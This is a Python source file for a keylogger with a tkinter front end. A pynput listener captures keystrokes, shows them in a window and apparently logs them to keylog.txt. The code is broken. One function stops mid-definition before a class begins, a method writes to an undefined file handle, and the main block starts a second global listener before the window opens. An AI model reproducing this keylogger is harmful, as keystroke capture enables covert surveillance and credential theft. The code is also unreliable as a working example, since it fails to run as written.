import tkinter as tk
from tkinter import scrolledtext
from pynput import keyboard

def keypressed(key):
    print(str(key))
    with open("keylog.txt", 'a') as logkey:
class KeyloggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger Frontend")
        
        # Text area to display logged keystrokes
        self.text_area = scrolledtext.ScrolledText(root, width=60, height=20, wrap=tk.WORD)
        self.text_area.pack(padx=10, pady=10)
        # Start and Stop buttons
        self.start_button = tk.Button(root, text="Start Logging", command=self.start_logging)
        self.start_button.pack(side=tk.LEFT, padx=10, pady=5)
        self.stop_button = tk.Button(root, text="Stop Logging", command=self.stop_logging, state=tk.DISABLED)
        self.stop_button.pack(side=tk.RIGHT, padx=10, pady=5)
        self.listener = None
        self.logging = False
    def keypressed(self, key):
        try:
            char = key.char
            logkey.write(char)
            if char:
                self.text_area.insert(tk.END, char)
                self.text_area.see(tk.END)
        except AttributeError:
            print("error getting char")
            if key == keyboard.Key.space:
                self.text_area.insert(tk.END, ' ')
            elif key == keyboard.Key.enter:
                self.text_area.insert(tk.END, '\n')
            elif key == keyboard.Key.backspace:
                self.text_area.delete(tk.END + '-1c')
            else:
                self.text_area.insert(tk.END, f'[{key}]')
    def on_press(self, key):
        if self.logging:
            self.keypressed(key)
    def start_logging(self):
        if not self.logging:
            self.logging = True
            self.start_button.config(state=tk.DISABLED)
            self.stop_button.config(state=tk.NORMAL)
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
    def stop_logging(self):
        if self.logging:
            self.logging = False
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)
            if self.listener:
                self.listener.stop()

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keypressed)
    listener.start()
    input()
    root = tk.Tk()
    app = KeyloggerApp(root)
    root.mainloop()
